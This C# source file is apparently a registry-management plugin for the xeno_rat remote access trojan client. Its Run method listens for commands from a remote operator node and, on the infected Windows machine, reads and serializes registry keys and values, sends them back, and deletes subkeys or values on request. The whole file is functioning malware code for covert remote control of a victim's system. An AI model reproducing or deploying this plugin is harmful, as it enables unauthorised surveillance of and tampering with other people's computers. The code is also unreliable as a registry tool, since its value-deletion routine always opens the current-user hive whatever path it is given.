using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using xeno_rat_client;


namespace Plugin
{
    public class RegValue
    {
        public string KeyName { get; set; }
        public string FullPath { get; set; }
        public string Type { get; set; }
        public object Value { get; set; }
    }
    public class RegInfo
    {
        public bool ContainsSubKeys { get; set; }
        public string[] subKeys { get; set; }
        public string FullPath { get; set; }
        public List<RegValue> Values = new List<RegValue>();
    }
    public class Main
    {

        /// <summary>
        /// Gets the root registry hive based on the provided key path.
        /// </summary>
        /// <param name="keyPath">The registry key path.</param>
        /// <returns>The root registry hive based on the provided <paramref name="keyPath"/>.</returns>
        /// <remarks>
        /// This method splits the input <paramref name="keyPath"/> and checks the first part to determine the root registry hive.
        /// If the first part matches any of the predefined registry hive names, it returns the corresponding RegistryHive value.
        /// If no match is found, it returns null.
        /// </remarks>
        private static RegistryHive? GetRootKeyName(string keyPath)
        {
            string[] parts = keyPath.Split('\\');
            if (parts.Length > 0)
            {
                string firstPart = parts[0].ToUpper();
                if (firstPart.StartsWith("HKLM") || firstPart.StartsWith("HKEY_LOCAL_MACHINE"))
                    return RegistryHive.LocalMachine;
                else if (firstPart.StartsWith("HKCU") || firstPart.StartsWith("HKEY_CURRENT_USER"))
                    return RegistryHive.CurrentUser;
                else if (firstPart.StartsWith("HKCR") || firstPart.StartsWith("HKEY_CLASSES_ROOT"))
                    return RegistryHive.ClassesRoot;
                else if (firstPart.StartsWith("HKU") || firstPart.StartsWith("HKEY_USERS"))
                    return RegistryHive.Users;
                else if (firstPart.StartsWith("HKCC") || firstPart.StartsWith("HKEY_CURRENT_CONFIG"))
                    return RegistryHive.CurrentConfig;
            }

            return null;
        }

        /// <summary>
        /// Retrieves information about a registry key at the specified path.
        /// </summary>
        /// <param name="path">The path of the registry key to retrieve information for.</param>
        /// <returns>A <see cref="RegInfo"/> object containing information about the specified registry key, or null if the key does not exist.</returns>
        /// <exception cref="System.Security.SecurityException">The user does not have the necessary registry rights.</exception>
        /// <exception cref="System.ArgumentException">path is longer than the system-defined maximum length.</exception>
        /// <exception cref="System.ArgumentNullException">path is null.</exception>
        /// <exception cref="System.ObjectDisposedException">The RegistryKey on which this method is being invoked is closed and access is requested.</exception>
        /// <remarks>
        /// This method retrieves information about a registry key at the specified path. It first determines the root key name from the path, then opens the registry key using the 64-bit view.
        /// It then retrieves various information about the key such as its full path, whether it contains subkeys, and the names and values of its subkeys.
        /// The method returns a <see cref="RegInfo"/> object containing the retrieved information, or null if the key does not exist.
        /// </remarks>
        private static RegInfo GetRegInfo(string path)
        {
            RegistryHive? _hive = GetRootKeyName(path);
            RegInfo retData = null;
            if (_hive == null) return null;
            int lastIndex = path.IndexOf('\\');
            string result = "";
            if (lastIndex >= 0)
            {
                result = path.Substring(lastIndex + 1);
            }
            using (RegistryKey hive = RegistryKey.OpenBaseKey((RegistryHive)_hive, RegistryView.Registry64))
            {
                using (RegistryKey registryKey = hive.OpenSubKey(result))
                {
                    if (registryKey != null)
                    {
                        retData = new RegInfo();
                        retData.FullPath = path;
                        retData.ContainsSubKeys = registryKey.SubKeyCount > 0;
                        retData.subKeys = registryKey.GetSubKeyNames();
                        foreach (string i in registryKey.GetValueNames())
                        {
                            RegValue val = new RegValue();
                            string type = "Unknown";
                            switch (registryKey.GetValueKind(i))
                            {
                                case RegistryValueKind.String:
                                    type = "REG_SZ";
                                    break;
                                case RegistryValueKind.ExpandString:
                                    type = "REG_EXPAND_SZ";
                                    break;
                                case RegistryValueKind.Binary:
                                    type = "REG_BINARY";
                                    break;
                                case RegistryValueKind.DWord:
                                    type = "REG_DWORD";
                                    break;
                                case RegistryValueKind.MultiString:
                                    type = "REG_MULTI_SZ";
                                    break;
                                case RegistryValueKind.QWord:
                                    type = "REG_QWORD";
                                    break;
                            }
                            val.Type = type;
                            val.Value = registryKey.GetValue(i);
                            val.FullPath = path + "\\" + i;
                            val.KeyName = i;
                            retData.Values.Add(val);
                        }
                    }
                }
            }
            return retData;
        }
        private static readonly Dictionary<string, byte> TypeIdentifierMap = new Dictionary<string, byte>
        {
            { "REG_SZ", 1 },
            { "REG_EXPAND_SZ", 2 },
            { "REG_BINARY", 3 },
            { "REG_DWORD", 4 },
            { "REG_MULTI_SZ", 5 },
            { "REG_QWORD", 6 },
            { "Unknown", 7 }
        };

        /// <summary>
        /// Serializes the provided RegInfo object into a byte array.
        /// </summary>
        /// <param name="regInfo">The RegInfo object to be serialized.</param>
        /// <returns>A byte array representing the serialized data of the <paramref name="regInfo"/>.</returns>
        /// <remarks>
        /// This method serializes the provided <paramref name="regInfo"/> object into a byte array using a BinaryWriter and MemoryStream.
        /// It writes various properties and values of the <paramref name="regInfo"/> object into the memory stream in a specific format.
        /// The serialization process involves writing information about subkeys, full path, values, and their types into the byte array.
        /// The method returns the resulting byte array containing the serialized data of the <paramref name="regInfo"/> object.
        /// </remarks>
        public static byte[] SerializeRegInfo(RegInfo regInfo)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            using (BinaryWriter writer = new BinaryWriter(memoryStream))
            {
                writer.Write(regInfo.ContainsSubKeys);
                writer.Write(regInfo.subKeys.Length);
                foreach (string subKey in regInfo.subKeys)
                {
                    writer.Write(subKey);
                }
                writer.Write(regInfo.FullPath);
                writer.Write(regInfo.Values.Count);

                foreach (RegValue value in regInfo.Values)
                {
                    writer.Write(value.KeyName);
                    writer.Write(value.FullPath);
                    writer.Write(TypeIdentifierMap[value.Type]);

                    if (value.Value is string)
                    {
                        writer.Write((byte)TypeIdentifierMap["REG_SZ"]);
                        writer.Write((string)value.Value);
                    }
                    else if (value.Value is int)
                    {
                        writer.Write((byte)TypeIdentifierMap["REG_DWORD"]);
                        writer.Write((int)value.Value);
                    }
                    else if (value.Value is long)
                    {
                        writer.Write((byte)TypeIdentifierMap["REG_QWORD"]);
                        writer.Write((long)value.Value);
                    }
                    else if (value.Value is byte[])
                    {
                        writer.Write((byte)TypeIdentifierMap["REG_BINARY"]);
                        byte[] byteArray = (byte[])value.Value;
                        writer.Write(byteArray.Length);
                        writer.Write(byteArray);
                    }
                    else if (value.Value is string[])
                    {
                        writer.Write((byte)TypeIdentifierMap["REG_MULTI_SZ"]);
                        string[] stringArray = (string[])value.Value;
                        writer.Write(stringArray.Length);
                        foreach (string str in stringArray)
                        {
                            writer.Write(str);
                        }
                    }
                    else
                    {
                        writer.Write((byte)TypeIdentifierMap["Unknown"]);
                    }
                }

                return memoryStream.ToArray();
            }
        }

        /// <summary>
        /// Deletes the specified registry subkey.
        /// </summary>
        /// <param name="path">The path of the registry subkey to be deleted.</param>
        /// <returns>True if the registry subkey was successfully deleted; otherwise, false.</returns>
        /// <remarks>
        /// This method attempts to delete the specified registry subkey identified by the given <paramref name="path"/>.
        /// If successful, it returns true; otherwise, it returns false.
        /// </remarks>
        public bool DeleteRegistrySubkey(string path)
        {
            RegistryHive? _hive= GetRootKeyName(path);
            if (_hive == null) return false;
            RegistryHive hive = (RegistryHive)_hive;
            bool worked = true;
            int lastIndex = path.IndexOf('\\');
            string result = "";
            if (lastIndex >= 0)
            {
                result = path.Substring(lastIndex + 1);
            }
            using (var baseKey = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64))
            {
                try
                {
                    baseKey.DeleteSubKeyTree(result);
                }
                catch 
                {
                    worked = false;
                }
            }
            return worked;
        }

        /// <summary>
        /// Deletes a registry value from the specified path and key name.
        /// </summary>
        /// <param name="path">The path of the registry key.</param>
        /// <param name="keyname">The name of the registry key to be deleted.</param>
        /// <returns>True if the registry key was successfully deleted; otherwise, false.</returns>
        /// <remarks>
        /// This method attempts to delete the specified registry value from the given path and key name.
        /// If the operation is successful, it returns true; otherwise, it returns false.
        /// </remarks>
        public bool DeleteRegistryValue(string path, string keyname)
        {
            RegistryHive? _hive = GetRootKeyName(path);
            if (_hive == null) return false;
            RegistryHive hive = (RegistryHive)_hive;
            bool worked = true;
            int lastIndex = path.IndexOf('\\');
            string result = "";
            if (lastIndex >= 0)
            {
                result = path.Substring(lastIndex + 1);
            }
            using (var baseKey = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64))
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(result, true))
                {
                    if (key == null)
                    {
                        worked = false;
                    }
                    else
                    {
                        try
                        {
                            key.DeleteValue(keyname);
                        }
                        catch 
                        {
                            worked = false;
                        }
                    }
                }
            }
            return worked;
        }

        /// <summary>
        /// Asynchronously runs the specified node and handles communication with it.
        /// </summary>
        /// <param name="node">The node to be run and communicated with.</param>
        /// <exception cref="ArgumentNullException">Thrown when the <paramref name="node"/> is null.</exception>
        /// <returns>A <see cref="Task"/> representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method sends a byte array with a value of 3 to indicate that it has connected to the specified <paramref name="node"/>.
        /// It then enters a loop to continuously receive data from the <paramref name="node"/>.
        /// Upon receiving data, it checks the first byte of the received data and performs different actions based on its value.
        /// If the first byte is 1, it receives a byte array representing a path, retrieves registry information for that path using the <see cref="GetRegInfo"/> method, and sends the retrieved information back to the node after serialization.
        /// If the first byte is 2, it receives a byte array representing a path, attempts to delete the registry subkey at that path using the <see cref="DeleteRegistrySubkey"/> method, and sends the result back to the node.
        /// If the first byte is 3, it receives byte arrays representing a path and a key name, attempts to delete the registry value at the specified path and key name using the <see cref="DeleteRegistryValue"/> method, and sends the result back to the node.
        /// If any exceptions occur during these operations, a byte array with a value of 0 is sent back to the node.
        /// </remarks>
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            while (node.Connected()) 
            {
                byte[] data = await node.ReceiveAsync();
                if (data == null) 
                {
                    break;
                }
                if (data[0] == 1) 
                {
                    byte[] byte_path = await node.ReceiveAsync();
                    string path=Encoding.UTF8.GetString(byte_path);
                    try { 
                        RegInfo path_info = GetRegInfo(path);
                        if (path_info != null)
                        {
                            await node.SendAsync(new byte[] { 1 });
                            await node.SendAsync(SerializeRegInfo(path_info));
                        }
                        else 
                        {
                            await node.SendAsync(new byte[] { 0 });
                        }
                    }
                    catch
                    {
                        await node.SendAsync(new byte[] { 0 });
                    }
                }
                if (data[0] == 2)
                {
                    byte[] byte_path = await node.ReceiveAsync();
                    string path = Encoding.UTF8.GetString(byte_path);
                    try { 
                        bool worked = DeleteRegistrySubkey(path);
                        if (worked)
                        {
                            await node.SendAsync(new byte[] { 1 });
                        }
                        else
                        {
                            await node.SendAsync(new byte[] { 0 });
                        }
                    }
                    catch
                    {
                        await node.SendAsync(new byte[] { 0 });
                    }
                }
                if (data[0] == 3)
                {
                    byte[] byte_path = await node.ReceiveAsync();
                    byte[] byte_keyname = await node.ReceiveAsync();
                    string path = Encoding.UTF8.GetString(byte_path);
                    string keyname = Encoding.UTF8.GetString(byte_keyname);
                    try
                    {
                        bool worked = DeleteRegistryValue(path, keyname);
                        if (worked)
                        {
                            await node.SendAsync(new byte[] { 1 });
                        }
                        else
                        {
                            await node.SendAsync(new byte[] { 0 });
                        }
                    }
                    catch 
                    {
                        await node.SendAsync(new byte[] { 0 });
                    }
                }
            }
            //string key = @"HKEY_CURRENT_USER\AppEvents";
            //var a = GetRegInfo(key);
            //byte[] data = SerializeRegInfo(a);
            

        }
    }
}
